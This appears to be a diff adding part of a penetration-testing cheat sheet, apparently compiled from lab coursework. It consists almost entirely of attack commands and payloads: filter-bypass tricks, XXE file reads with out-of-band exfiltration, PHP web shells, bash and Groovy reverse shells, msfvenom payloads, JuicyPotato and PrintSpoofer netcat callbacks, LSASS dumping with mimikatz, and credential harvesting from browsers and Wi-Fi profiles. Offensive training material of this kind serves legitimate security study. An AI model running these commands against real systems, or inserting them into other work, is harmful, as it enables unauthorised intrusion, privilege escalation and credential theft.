+|`bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`|Execute b64 encoded string|
+
+---
+
+### Windows: Filtered Character Bypass
+
+|Code|Description|
+|---|---|
+|`Get-ChildItem Env:`|Can be used to view all environment variables - (PowerShell)|
+|**Spaces**||
+|`%09`|Using tabs instead of spaces|
+|`%PROGRAMFILES:~10,-5%`|Will be replaced with a space - (CMD)|
+|`$env:PROGRAMFILES[10]`|Will be replaced with a space - (PowerShell)|
+|**Other Characters**||
+|`%HOMEPATH:~0,-17%`|Will be replaced with `\` - (CMD)|
+|`$env:HOMEPATH[0]`|Will be replaced with `\` - (PowerShell)|
+
+---
+
+### Windows: Blacklisted Command Bypass
+
+| Code                                                                                                         | Description                              |
+| ------------------------------------------------------------------------------------------------------------ | ---------------------------------------- |
+| **Character Insertion**                                                                                      |                                          |
+| `'` or `"`                                                                                                   | Total must be even                       |
+| `^`                                                                                                          | Windows only (CMD)                       |
+| **Case Manipulation**                                                                                        |                                          |
+| `WhoAmi`                                                                                                     | Simply send the character with odd cases |
+| **Reversed Commands**                                                                                        |                                          |
+| `"whoami"[-1..-20] -join ''`                                                                                 | Reverse a string                         |
+| `iex "$('imaohw'[-1..-20] -join '')"`                                                                        | Execute reversed command                 |
+| **Encoded Commands**                                                                                         |                                          |
+| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`                              | Encode a string with base64              |
+| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 encoded string               |
+
+
+## Web attacks
+
+### XXE
+
+|**Code**|**Description**|
+|---|---|
+|`<!ENTITY xxe SYSTEM "http://localhost/email.dtd">`|Define External Entity to a URL|
+|`<!ENTITY xxe SYSTEM "file:///etc/passwd">`|Define External Entity to a file path|
+|`<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">`|Read PHP source code with base64 encode filter|
+|`<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">`|Reading a file through a PHP error|
+|`<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">`|Reading a file OOB exfiltration|
+
+
+## Attacking Common Web applications
+
+|Command|Description|
+|---|---|
+|`sudo vim /etc/hosts`|Opens the `/etc/hosts` with `vim` to start adding hostnames|
+|`sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list`|Runs an nmap scan using common web application ports based on a scope list (`scope_list`) and outputs to a file (`web_discovery`) in all formats (`-oA`)|
+|`eyewitness --web -x web_discovery.xml -d <nameofdirectorytobecreated>`|Runs `eyewitness` using a file generated by an nmap scan (`web_discovery.xml`) and creates a directory (`-d`)|
+|`cat web_discovery.xml \| ./aquatone -nmap`|Concatenates the contents of nmap scan output (web_discovery.xml) and pipes it to aquatone (`./aquatone`) while ensuring aquatone recognizes the file as nmap scan output (`-nmap`)|
+|`sudo wpscan --url <http://domainnameoripaddress> --enumerate`|Runs wpscan using the `--enmuerate` flag. Can replace the url with any valid and reachable URL in each challenge|
+|`sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url <http://domainnameoripaddress>`|Runs wpscan and uses it to perform a password attack (`--password-attack`) against the specified url and references a word list (`/usr/share/wordlists/rockyou.txt`)|
+|`curl -s http://<hostnameoripoftargetsite/path/to/webshell.php?cmd=id`|cURL command used to execute commands (`cmd=id`) on a vulnerable system utilizing a php-based webshell|
+|`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip address of attack box>/<port of choice> 0>&1'");`|PHP code that will execute a reverse shell on a Linux-based system|
+|`droopescan scan joomla --url http://<domainnameoripaddress>`|Runs `droopescan` against a joomla site located at the specified url|
+|`sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr <username or path to username list>`|Runs joomla-brute.py tool with python3 against a specified url, utilizing a specified wordlist (`/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt`) and user or list of usernames (`-usr`)|
+|`<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>`|PHP code that will allow for web shell access on a vulnerable drupal site. Can be used through browisng to the location of the file in the web directory after saving. Can also be leveraged utilizing curl. See next command.|
+|`curl -s <http://domainname or IP address of site> /node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id \| grep uid \| cut -f4 -d">"`|Uses curl to navigate to php web shell file and run system commands (`=id`) on the target|
+|`gobuster dir -u <http://domainnameoripaddressofsite> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt`|`gobuster` powered directory brute forcing attack refrencing a wordlist (`/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt`)|
+|`auxiliary/scanner/http/tomcat_mgr_login`|Useful Metasploit scanner module used to perform a bruteforce login attack against a tomcat site|
+|`python3 mgr_brute.py -U <http://domainnameoripaddressofTomCatsite> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt`|Runs mgr_brute.py using python3 against the specified website starts in the /manager directory (`-P /manager`) and references a specified user or userlist ( `-u`) as well as a specified password or password list (`-p`)|
+|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address of attack box> LPORT=<port to listen on to catch a shell> -f war > backup.war`|Generates a jsp-based reverse shell payload in the form of a .war file utilizing `msfvenom`|
+|`nmap -sV -p 8009,8080 <domainname or IP address of tomcat site>`|Nmap scan useful in enumerating Apache Tomcat and AJP services|
+|`r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 \| while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()`|Groovy-based reverse shell payload/code that can work with admin access to the `Script Console` of a `Jenkins` site. Will work when the underlying OS is Linux|
+|`def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");`|Groovy-based payload/code that can work with admin access to the `Script Console` of a `Jenkins` site. This will allow webshell access and to execute commands on the underlying Windows system|
+|`String host="localhost"; int port=8044; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So);`|Groovy-based reverse shell payload/code that can work with admin acess to the `Script Console` of a `Jenkins`site. Will work when the underlying OS is Windows|
+|[reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk)|A simple Splunk package for obtaining revershells on Windows and Linux systems|
+
+
+## Linux Privilege Escalation
+
+|**Command**|**Description**|
+|---|---|
+|`ssh htb-student@<target IP>`|SSH to lab target|
+|`ps aux \| grep root`|See processes running as root|
+|`ps au`|See logged in users|
+|`ls /home`|View user home directories|
+|`ls -l ~/.ssh`|Check for SSH keys for current user|
+|`history`|Check the current user's Bash history|
+|`sudo -l`|Can the user run anything as another user?|
+|`ls -la /etc/cron.daily`|Check for daily Cron jobs|
+|`lsblk`|Check for unmounted file systems/drives|
+|`find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`|Find world-writeable directories|
+|`find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`|Find world-writeable files|
+|`uname -a`|Check the Kernel versiion|
+|`cat /etc/lsb-release`|Check the OS version|
+|`gcc kernel_expoit.c -o kernel_expoit`|Compile an exploit written in C|
+|`screen -v`|Check the installed version of `Screen`|
+|`./pspy64 -pf -i 1000`|View running processes with `pspy`|
+|`find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`|Find binaries with the SUID bit set|
+|`find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null`|Find binaries with the SETGID bit set|
+|`sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root`|Priv esc with `tcpdump`|
+|`echo $PATH`|Check the current user's PATH variable contents|
+|`PATH=.:${PATH}`|Add a `.` to the beginning of the current user's PATH|
+|`find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`|Search for config files|
+|`ldd /bin/ls`|View the shared objects required by a binary|
+|`sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart`|Escalate privileges using `LD_PRELOAD`|
+|`readelf -d payroll \| grep PATH`|Check the RUNPATH of a binary|
+|`gcc src.c -fPIC -shared -o /development/libshared.so`|Compiled a shared libary|
+|`lxd init`|Start the LXD initialization process|
+|`lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`|Import a local image|
+|`lxc init alpine r00t -c security.privileged=true`|Start a privileged LXD container|
+|`lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`|Mount the host file system in a container|
+|`lxc start r00t`|Start the container|
+|`showmount -e 10.129.2.12`|Show the NFS export list|
+|`sudo mount -t nfs 10.129.2.12:/tmp /mnt`|Mount an NFS share locally|
+|`tmux -S /shareds new -s debugsess`|Created a shared `tmux` session socket|
+|`./lynis audit system`|Perform a system audit with `Lynis`|
+
+## Windows privilege escalation
+
+### Initial Enumeration
+
+|**Command**|**Description**|
+|---|---|
+|`xfreerdp /v:<target ip> /u:htb-student`|RDP to lab target|
+|`ipconfig /all`|Get interface, IP address and DNS information|
+|`arp -a`|Review ARP table|
+|`route print`|Review routing table|
+|`Get-MpComputerStatus`|Check Windows Defender status|
+|`Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections`|List AppLocker rules|
+|`Get-AppLockerPolicy -Local \| Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone`|Test AppLocker policy|
+|`set`|Display all environment variables|
+|`systeminfo`|View detailed system configuration information|
+|`wmic qfe`|Get patches and updates|
+|`wmic product get name`|Get installed programs|
+|`tasklist /svc`|Display running processes|
+|`query user`|Get logged-in users|
+|`echo %USERNAME%`|Get current user|
+|`whoami /priv`|View current user privileges|
+|`whoami /groups`|View current user group information|
+|`net user`|Get all system users|
+|`net localgroup`|Get all system groups|
+|`net localgroup administrators`|View details about a group|
+|`net accounts`|Get passsword policy|
+|`netstat -ano`|Display active network connections|
+|`pipelist.exe /accepteula`|List named pipes|
+|`gci \\.\pipe\`|List named pipes with PowerShell|
+|`accesschk.exe /accepteula \\.\Pipe\lsass -v`|Review permissions on a named pipe|
+
+### Handy Commands
+
+|**Command**|**Description**|
+|---|---|
+|`mssqlclient.py sql_dev@10.129.43.30 -windows-auth`|Connect using mssqlclient.py|
+|`enable_xp_cmdshell`|Enable xp_cmdshell with mssqlclient.py|
+|`xp_cmdshell whoami`|Run OS commands with xp_cmdshell|
+|`c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *`|Escalate privileges with JuicyPotato|
+|`c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"`|Escalating privileges with PrintSpoofer|
+|`procdump.exe -accepteula -ma lsass.exe lsass.dmp`|Take memory dump with ProcDump|
+|`sekurlsa::minidump lsass.dmp` and `sekurlsa::logonpasswords`|Use MimiKatz to extract credentials from LSASS memory dump|
+|`dir /q C:\backups\wwwroot\web.config`|Checking ownership of a file|
+|`takeown /f C:\backups\wwwroot\web.config`|Taking ownership of a file|
+|`Get-ChildItem -Path ‘C:\backups\wwwroot\web.config’ \| select name,directory, @{Name=“Owner”;Expression={(Ge t-ACL $_.Fullname).Owner}}`|Confirming changed ownership of a file|
+|`icacls “C:\backups\wwwroot\web.config” /grant htb-student:F`|Modifying a file ACL|
+|`secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`|Extract hashes with secretsdump.py|
+|`robocopy /B E:\Windows\NTDS .\ntds ntds.dit`|Copy files with ROBOCOPY|
+|`wevtutil qe Security /rd:true /f:text \| Select-String "/user"`|Searching security event logs|
+|`wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 \| findstr "/user"`|Passing credentials to wevtutil|
+|`Get-WinEvent -LogName security \| where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } \| Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}`|Searching event logs with PowerShell|
+|`msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll`|Generate malicious DLL|
+|`dnscmd.exe /config /serverlevelplugindll adduser.dll`|Loading a custom DLL with dnscmd|
+|`wmic useraccount where name="netadm" get sid`|Finding a user's SID|
+|`sc.exe sdshow DNS`|Checking permissions on DNS service|
+|`sc stop dns`|Stopping a service|
+|`sc start dns`|Starting a service|
+|`reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters`|Querying a registry key|
+|`reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll`|Deleting a registry key|
+|`sc query dns`|Checking a service status|
+|`Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local`|Disabling the global query block list|
+|`Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3`|Adding a WPAD record|
+|`cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp`|Compile with cl.exe|
+|`reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"`|Add reference to a driver (1)|
+|`reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1`|Add reference to a driver (2)|
+|`.\DriverView.exe /stext drivers.txt` and `cat drivers.txt \| Select-String -pattern Capcom`|Check if driver is loaded|
+|`EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys`|Using EopLoadDriver|
+|`c:\Tools\PsService.exe security AppReadiness`|Checking service permissions with PsService|
+|`sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"`|Modifying a service binary path|
+|`REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`|Confirming UAC is enabled|
+|`REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`|Checking UAC level|
+|`[environment]::OSVersion.Version`|Checking Windows version|
+|`cmd /c echo %PATH%`|Reviewing path variable|
+|`curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"`|Downloading file with cURL in PowerShell|
+|`rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll`|Executing custom dll with rundll32.exe|
+|`.\SharpUp.exe audit`|Running SharpUp|
+|`icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"`|Checking service permissions with icacls|
+|`cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"`|Replace a service binary|
+|`wmic service get name,displayname,pathname,startmode \| findstr /i "auto" \| findstr /i /v "c:\windows\\" \| findstr /i /v """`|Searching for unquoted service paths|
+|`accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services`|Checking for weak service ACLs in the Registry|
+|`Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"`|Changing ImagePath with PowerShell|
+|`Get-CimInstance Win32_StartupCommand \| select Name, command, Location, User \| fl`|Check startup programs|
+|`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe`|Generating a malicious binary|
+|`get-process -Id 3324`|Enumerating a process ID with PowerShell|
+|`get-service \| ? {$_.DisplayName -like 'Druva*'}`|Enumerate a running service by name with PowerShell|
+
+### Credential Theft
+
+|**Command**|**Description**|
+|---|---|
+|`findstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml`|Search for files with the phrase "password"|
+|`gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' \| Select-String password`|Searching for passwords in Chrome dictionary files|
+|`(Get-PSReadLineOption).HistorySavePath`|Confirm PowerShell history save path|
+|`gc (Get-PSReadLineOption).HistorySavePath`|Reading PowerShell history file|
+|`$credential = Import-Clixml -Path 'C:\scripts\pass.xml'`|Decrypting PowerShell credentials|
+|`cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt`|Searching file contents for a string|
+|`findstr /si password *.xml *.ini *.txt *.config`|Searching file contents for a string|
+|`findstr /spin "password" *.*`|Searching file contents for a string|
+|`select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password`|Search file contents with PowerShell|
+|`dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*`|Search for file extensions|
+|`where /R C:\ *.config`|Search for file extensions|
+|`Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore`|Search for file extensions using PowerShell|
+|`cmdkey /list`|List saved credentials|
+|`.\SharpChrome.exe logins /unprotect`|Retrieve saved Chrome credentials|
+|`.\lazagne.exe -h`|View LaZagne help menu|
+|`.\lazagne.exe all`|Run all LaZagne modules|
+|`Invoke-SessionGopher -Target WINLPE-SRV01`|Running SessionGopher|
+|`netsh wlan show profile`|View saved wireless networks|
+|`netsh wlan show profile ilfreight_corp key=clear`|Retrieve saved wireless passwords|
+
+### Other Commands
+
+|**Command**|**Description**|
+|---|---|
+|`certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat`|Transfer file with certutil|
+|`certutil -encode file1 encodedfile`|Encode file with certutil|
+|`certutil -decode encodedfile file2`|Decode file with certutil|
+|`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`|Query for always install elevated registry key (1)|
+|`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`|Query for always install elevated registry key (2)|
+|`msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi`|Generate a malicious MSI package|
+|`msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart`|Executing an MSI package from command line|
+|`schtasks /query /fo LIST /v`|Enumerate scheduled tasks|
+|`Get-ScheduledTask \| select TaskName,State`|Enumerate scheduled tasks with PowerShell|
+|`.\accesschk64.exe /accepteula -s -d C:\Scripts\`|Check permissions on a directory|
+|`Get-LocalUser`|Check local user description field|
+|`Get-WmiObject -Class Win32_OperatingSystem \| select Description`|Enumerate computer description field|
+|`guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd`|Mount VMDK on Linux|
+|`guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1`|Mount VHD/VHDX on Linux|
+|`sudo python2.7 windows-exploit-suggester.py --update`|Update Windows Exploit Suggester database|
+|`python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt`|Running Windows Exploit Suggester|
